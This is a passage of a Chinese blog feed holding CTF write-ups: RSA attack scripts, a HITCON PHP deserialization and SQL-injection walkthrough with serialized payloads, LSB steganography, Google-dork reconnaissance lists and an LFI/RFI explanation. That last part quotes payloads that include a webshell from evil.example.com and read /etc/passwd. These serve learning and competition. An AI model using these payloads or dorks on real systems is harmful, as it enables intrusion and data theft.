title="d泄露攻击"></a>d泄露攻击</h3><p><a href="http://www.ams.org/notices/199902/boneh.pdf" title="原理看这篇paper" target="_blank" rel="noopener">http://www.ams.org/notices/199902/boneh.pdf</a> </p><p>题目参考西湖论剑线下赛RSA</p><p>chall.py</p><pre><code>    from gmpy2 import invertfrom md5 import md5from secret import p, qe = 65537n = p*qphi = (p-1)*(q-1)d = invert(e, phi)print n, e, dprint &quot;Flag: flag{%s}&quot; %md5(str(p + q)).hexdigest()</code></pre><p>output</p><pre><code>n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e= 65537 d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453Flag: flag{xxxx}</code></pre><p>d 泄露之后我们可以解密所有加密的消息，还可以对模数进行分解，脚本如下</p><pre><code>import randomdef gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    a = b    b = tempreturn adef getpq(n,e,d):p = 1q = 1while p==1 and q==1:    k = d * e - 1    g = random.randint ( 0 , n )    while p==1 and q==1 and k % 2 == 0:        k /= 2        y = pow(g,k,n)        if y!=1 and gcd(y-1,n)&gt;1:            p = gcd(y-1,n)            q = n/pprint p,qdef main():n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e=65537d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453getpq(n,e,d)if __name__ == &apos;__main__&apos;:main()</code></pre><h3 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h3><p>当d比较小时，攻击者可以使用该攻击获取私钥。</p><pre><code>#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input(&apos;flag:&apos;)key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = &apos;AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q&apos;</code></pre><p>N,e都很大，使用脚本攻击<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p>2019强网杯后来的qwxf题</p><pre><code>flag=open(&quot;flag&quot;,&quot;rb&quot;).read()from Crypto.Util.number import getPrime,bytes_to_longp=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,np=getPrime(1024)e=65537n=p*qm=bytes_to_long(&quot;1&quot;*32)c=pow(m,e,n)print c,e,noutput:2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 65537 1496703005997511495029539987418504705373658788012799054203576520142577934243066251776506325878468586810706678947574718024471135264646977673293854464158384231379187298635750446218492407522743349863142328918798835147566678519085421038958759497545606498461199046112668430108624153291526731167516419021347424531101962365486593785165353287096542347455534823985802155158965016960243942384116069879333811520423814008573868088331343357406024360002850060082462435847340305959759389141217939916581362251290126338029956101962474148877936701938977578654729206535288500722423958177697589238536444644618564293913728751994597480772738290600395720427374966791868810679503289561331636299088723481081601295504376976771505994839239257982243281755944832179388335202200872303034701385259704689155111113203961854825647839754353463544400357769097811584076360449864038198406483796096300393488954150457232088436311912521426006676078074799541944472370610806183707876727203447414135379759221848593334321977665801505344570011967656216786599521080105962732442308123271827863297608440371497195872696321335951492940674909556448934027087202841797150021492240689288286565153264468817912286380085728893315119450429113729150038055054120991029540732990109518969553624706553714624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</code></pre><p>这里的N大到没法分解，但是两个N有公因数，就是p，通过求最大公因数得到p</p><pre><code>def gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    #print temp    a = b    b = tempreturn a</code></pre><p>之后也是常规解密</p><p>再来个网上找的全套的</p><pre><code>#  coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecsn1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309q=gmpy2.gcd(n1,n2)p1=n1//qp2=n2//qd1=gmpy2.invert(e1,(p1-1)*(q-1))d2=gmpy2.invert(e2,(p2-1)*(q-1))while d1&lt;0:        d1+=(p1-1)*(q-1)while d2&lt;0:        d2+=(p2-1)*(q-1)m2=hex(pow(c2,d2,n2))[2:].replace(&quot;L&quot;,&quot;&quot;)m1=hex(pow(c1,d1,n1))[2:].replace(&quot;L&quot;,&quot;&quot;)if(len(m2)%2==1):        m2=&apos;0&apos;+m2if(len(m1)%2==1):    m1 =&apos;0&apos;+ m1print m1.decode(&apos;hex&apos;)print m2.decode(&apos;hex&apos;)</code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击。</p><pre><code>import gmpy2n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249e1 = 773e2 = 839message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535# s &amp; tgcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0:       s = -s    message1 = gmpy2.invert(message1, n)if t &lt; 0:       t = -t    message2 = gmpy2.invert(message2, n)plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % nprint plain</code></pre><h3 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h3><p>e=3时</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-babytrick</title>
      <link href="/2018/03/23/HITCON-Babytrick/"/>
      <url>/2018/03/23/HITCON-Babytrick/</url>
      
        <content type="html"><![CDATA[<p>too hard</p><a id="more"></a><h1 id="HITCON-babytrick"><a href="#HITCON-babytrick" class="headerlink" title="HITCON-babytrick"></a>HITCON-babytrick</h1><p>##0x01 需要注意的点 ##</p><ul><li>php反序列化</li><li>简单的注入</li><li>字符集绕过</li></ul><h2 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h2><pre><code>index.php源码&lt;?phpinclude &quot;config.php&quot;;class HITCON{private $method;private $args;private $conn;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;    $this-&gt;__conn();}function show() {    list($username) = func_get_args();    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username);    $obj = $this-&gt;__query($sql);    if ( $obj != false  ) {        $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) );    } else {        $this-&gt;__die(&quot;Nobody Nobody But You!&quot;);    }}function login() {    global $FLAG;    list($username, $password) = func_get_args();    $username = strtolower(trim(mysql_escape_string($username)));    $password = strtolower(trim(mysql_escape_string($password)));    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password);    if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) {        $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);    }    $obj = $this-&gt;__query($sql);    if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {        $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);    } else {        $this-&gt;__die(&quot;Admin only!&quot;);    }}function source() {    highlight_file(__FILE__);}function __conn() {    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;    if (!$this-&gt;conn)        $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);    mysql_select_db($db_name, $this-&gt;conn);    if ($DEBUG) {        $sql = &quot;CREATE TABLE IF NOT EXISTS users (                     username VARCHAR(64),                     password VARCHAR(64),                     role VARCHAR(64)                ) CHARACTER SET utf8&quot;;        $this-&gt;__query($sql, $back=false);        $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;;        $this-&gt;__query($sql, $back=false);    }     mysql_query(&quot;SET names utf8&quot;);    mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;);}function __query($sql, $back=true) {    $result = @mysql_query($sql);    if ($back) {        return @mysql_fetch_object($result);    }}function __die($msg) {    $this-&gt;__close();    header(&quot;Content-Type: application/json&quot;);    die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) );}function __close() {    mysql_close($this-&gt;conn);}function __destruct() {    $this-&gt;__conn();    if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);    } else {        $this-&gt;__die(&quot;What do you do?&quot;);    }    $this-&gt;__close();}function __wakeup() {    foreach($this-&gt;args as $k =&gt; $v) {        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));    }}}if(isset($_GET[&quot;data&quot;])) {@unserialize($_GET[&quot;data&quot;]);    } else {new HITCON(&quot;source&quot;, array());}?&gt;下面的是config.php&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;babytrick&apos;;$db_user = &apos;babytrick&apos;;$db_pass = &apos;babytrick1234&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>为了在本地更好的复现，修改了部分config.php代码如下：</p><pre><code>&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;test1&apos;;$db_user = &apos;root&apos;;$db_pass = &apos;root&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>分析源码得到ROP链大致为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()。发现现在出现的函数里没有flag的影子，与FLAG有关的在login()函数里</p><pre><code>    $obj = $this-&gt;__query($sql);if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {    $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);} else {    $this-&gt;__die(&quot;Admin only!&quot;);}</code></pre><p>先跟进login()函数查看发现该函数的作用就是将$username和$password带入一条sql语句，在查询之前先进行一次过滤，之后如果查询后的结果满足if判断就可以拿到flag。也就是说我们现在首先要得到username和password的值，再观察代码可以看到conn()函数给出了题目数据库的结构</p><pre><code>+----------+----------+-------+| username | password | role  |+----------+----------+-------+| orange   | $db_pass | admin || phddaa   | ddaa     | user  |+----------+----------+-------+</code></pre><p>也就是说我们现在只剩password不知道了。<br>发现show()函数里对传入的参数没有过滤就带入数据库查询，可以在这里尝试注入得到password。</p><p>现在似乎该知道的都知道了，可是发现跟之前的序列化调用路径没有关系啊ε=ε=ε=┏(゜ロ゜;)┛</p><p>再看代码终于在destruct()里找到了这样的代码</p><pre><code>if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {@call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>这里限制了$method变量的值必须是这几个中的一种，而这三个又分别对应各自的函数。判断通过后调用回调函数将数组类型的args变量当作参数传入array()中执行method指定的方法。关于回调函数可以参考php_manual的介绍</p><pre><code>&lt;?phpfunction foobar($arg, $arg2) {echo __FUNCTION__, &quot; got $arg and $arg2\n&quot;;}class foo {function bar($arg, $arg2) {    echo __METHOD__, &quot; got $arg and $arg2\n&quot;;}}// Call the foobar() function with 2 argumentscall_user_func_array(&quot;foobar&quot;, array(&quot;one&quot;, &quot;two&quot;));// Call the $foo-&gt;bar() method with 2 arguments$foo = new foo;call_user_func_array(array($foo, &quot;bar&quot;), array(&quot;three&quot;, &quot;four&quot;));?&gt;输出类似于foobar got one and twofoo::bar got three and four</code></pre><p>好的，终于把思路理清楚了新的ROP为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()-&gt;show()-&gt;login().</p><h2 id="0x03开始构造序列化字符串"><a href="#0x03开始构造序列化字符串" class="headerlink" title="0x03开始构造序列化字符串"></a>0x03开始构造序列化字符串</h2><pre><code>class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}}$method = &quot;show&quot;;$args = array(&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;);$a = new HITCON($method,$args);echo serialize($a);  O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;;}}</code></pre><p>这里需要注意的是wake_up()对args进行过滤，因此我们要绕过它，把变量的个数设置大于实际个数就可以，还要注意的是私有变量前后会多两个%00长度也多二。知道这些之后就可以得到password了。</p><pre><code>{&quot;msg&quot;:&quot;root is admin&quot;}</code></pre><p>再进行下一步login()：</p><pre><code>    class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}    $method = &quot;login&quot;;$args = array(&apos;orange&apos;,&apos;root&apos;);$b = new HITCON($method,$args);echo serialize($b);O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:6:&quot;orange&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到如下结果</p><pre><code>{&quot;msg&quot;:&quot;Orange is so shy. He do not want to see you.&quot;}</code></pre><p>还需要绕过对orange的判断。由于代码中在链接数据库时设置了字符编码为utf8编码，所以尝试字符差异绕过<br>将a替换成Ã、Ä…这里注意替换完之后长度会加一。同理替换e或着其他的字母都行。</p><pre><code>O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:7:&quot;orÄnge&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到flag</p><pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;}</code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>做题时思路要发散，做题看到反序列化就盯着几个魔法函数不动也不行。</p><p>对于关键的函数一定要好好查查清楚到底啥作用，你问什么是关键函数？一个一个去查手册啊，就像这道题的回调函数，我刚开始看的时候死活找不到怎么把flag和反序列化联系在一起，真的是看的头秃才注意到回调函数/(ㄒoㄒ)/~~。</p><p>构造序列化字符串还不熟，这道题的第二个反序列化做的时候也是没一下想到怎么把username和password传进去，还是自己太菜。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><blockquote><p><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116705.html</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/77749008" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77749008</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB图片隐写</title>
      <link href="/2018/03/23/LSB%E9%9A%90%E5%86%99/"/>
      <url>/2018/03/23/LSB%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>图片隐写题老是一头雾水，借着DD的地铁来学一下吧</p><a id="more"></a><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>利用图像中的最低有效位进行数据存储。</p><p><img src="https://i.imgur.com/GQM4keP.png" alt="RGB构成"></p><p>一般来说这种隐写都是用BMP图片，不经过压缩，所有的像素都原样存储。png图片有压缩但是却是无损压缩，所以修改的信息也可以正确表达，jpg图片进行压缩之后隐藏的信息可能会被破坏。<br>像素一般由RGB三原色组成，每种颜色占8位，取值为0x00~0xFF,共256种颜色，包含256的3次方种颜色，即16777216种。而人眼大约只能区分1000万种。<br>LSB隐写就是修改RGB颜色分量的最低有效位，每个像素可以携带3比特的信息。</p><p><img src="https://i.imgur.com/jHssNqf.png" alt></p><p>修改绿色的二进制最低位，颜色几乎没有变化，实现信息隐写。</p><p><img src="https://i.imgur.com/ENiocXR.png" alt></p><p><img src="https://i.imgur.com/IHphbX3.png" alt></p><h2 id="来看DD这道题"><a href="#来看DD这道题" class="headerlink" title="来看DD这道题"></a>来看DD这道题</h2><p>给了一张位图，是北京的地铁图。</p><p><img src="https://i.imgur.com/f8eaJYG.png" alt></p><p>尝试LSB，查看低位信息。得到一串密文。</p><p><img src="https://i.imgur.com/04P5AzP.png" alt></p><p>提示是AES，缺少key<br>异或查看图片有两处不同</p><p><img src="https://i.imgur.com/93KEfF7.png" alt></p><p><img src="https://i.imgur.com/NRCfUQe.png" alt></p><p>提示密钥为小写字母，尝试解密就得到了flag.</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LSB </tag>
            
            <tag> MISC </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-信息收集</title>
      <link href="/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>Google-hacking</p><a id="more"></a><h1 id="渗透测试-信息收集"><a href="#渗透测试-信息收集" class="headerlink" title="渗透测试-信息收集"></a>渗透测试-信息收集</h1><h2 id="0x0-Google-hacking"><a href="#0x0-Google-hacking" class="headerlink" title="0x0 Google-hacking"></a>0x0 Google-hacking</h2><h3 id="常用GoogleHacking语法"><a href="#常用GoogleHacking语法" class="headerlink" title="常用GoogleHacking语法"></a>常用GoogleHacking语法</h3><ul><li>intext:(only google)把网页中的正文内容中的某个字符作为搜索条件</li><li>intitle:把网页标题中的某个字符作为搜索的条件</li><li>cache：搜索搜索引擎里关于某些内容的缓存，可能胡会在过期内容中发现有价值信息</li><li>filetype:指定文件格式</li><li>inurl:搜索包含指定字符的url</li><li>site:在指定站点搜索相关内容</li></ul><h3 id="其他语法"><a href="#其他语法" class="headerlink" title="其他语法"></a>其他语法</h3><ol><li>引号””:把关键字打上引号后把引号作为整体来搜索。</li><li>or：同时搜索两个或者更多关键字。</li><li>link：搜索某个网站的链接。</li></ol><h3 id="典型用法"><a href="#典型用法" class="headerlink" title="典型用法"></a>典型用法</h3><ol><li><p>找管理后台地址：</p><p> site:xxx.com intext:管理|后台|登录|用户名|密码|系统|账号</p><p> site:xxx.com inurl:login|admin|manage|manager|admin_login|system</p><p> site:Xxx.com intitle:管理|后台|登录</p></li><li><p>找上传类漏洞地址</p><p> site:xxx.com inurl:file</p><p> site:xxx.com inurl:upload</p></li><li><p>找注入页面</p><p> site:xxx.com inurl:php?id=</p></li><li><p>找编辑器页面</p><p> site:xxx.com inurl:ewebeditor<br>##0x1 通过目标站点收集信息 ##</p></li></ol><h3 id="使用站长工具对目标站点进行信息收集"><a href="#使用站长工具对目标站点进行信息收集" class="headerlink" title="使用站长工具对目标站点进行信息收集"></a>使用站长工具对目标站点进行信息收集</h3><ol><li>IP查询</li><li>同IP查询</li><li>WHOIS查询和反查</li><li>子域名查询</li><li>识别服务器类型，页面类型</li><li>DNS信息查询</li><li>网站安全检测</li><li>端口扫描<h2 id="0x2漏洞信息收集"><a href="#0x2漏洞信息收集" class="headerlink" title="0x2漏洞信息收集"></a>0x2漏洞信息收集</h2><h3 id="常用漏洞平台"><a href="#常用漏洞平台" class="headerlink" title="常用漏洞平台"></a>常用漏洞平台</h3></li><li>乌云</li><li>360补天漏洞平台</li><li>Exploit-DB</li><li>GHDB</li><li>CVE中文漏洞信息库</li><li>中国国家信息安全漏洞库</li><li>国家信息安全漏洞共享平台<h3 id="漏洞库搜索方式"><a href="#漏洞库搜索方式" class="headerlink" title="漏洞库搜索方式"></a>漏洞库搜索方式</h3></li><li>搜索对应厂商</li><li>搜索对应平台<h3 id="信息收集的目标"><a href="#信息收集的目标" class="headerlink" title="信息收集的目标"></a>信息收集的目标</h3></li><li>已有的渗透过程</li><li>目标的技术架构</li><li>目标使用架构的公开漏洞</li><li>目标可能进行的修复<br>##0x3 使用工具搜索信息 ##<h3 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h3></li><li>ping：网络联通测试</li><li>arp：显示和修改地址解析协议</li><li>tracert：显示路由</li><li>nslookup：域名系统查询</li><li>telnet: 测试是否开启远程连接</li><li>netstat：查看本地机器开放所有端口</li><li>nbtstat：获取NetBIOS信息</li><li>ftp: 测试开放了ftp的远程主机</li><li>net：最重要命令，需要掌握子命令<h3 id="常用扫描工具"><a href="#常用扫描工具" class="headerlink" title="常用扫描工具"></a>常用扫描工具</h3></li></ol><ol><li>AWVS</li><li>Appscan</li><li>Zenmap</li><li>御剑系列</li><li>Maltego </li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2016 mfw Writeup</title>
      <link href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/"/>
      <url>/2018/03/23/CSAW-CTF-2016-mfw-Writeup/</url>
      
        <content type="html"><![CDATA[<p>i cant input chinese,so,here is my poor english !</p><a id="more"></a><h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol><li>本地文件包含</li><li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li></ol><p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p><hr><p>** most notable are the include and require statements.**</p><hr><p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p><hr><p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p><hr><p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p><hr><p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p><p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p><p>Example：</p><pre><code>&lt;?php   if ( isset( $_GET[&apos;language&apos;] ) ) {  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );   }?&gt;&lt;form method=&quot;get&quot;&gt;   &lt;select name=&quot;language&quot;&gt;      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;      ...   &lt;/select&gt;   &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><p>以下是payload:</p><pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p><h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p><p>查看源码，发现可能的漏洞</p><p><img 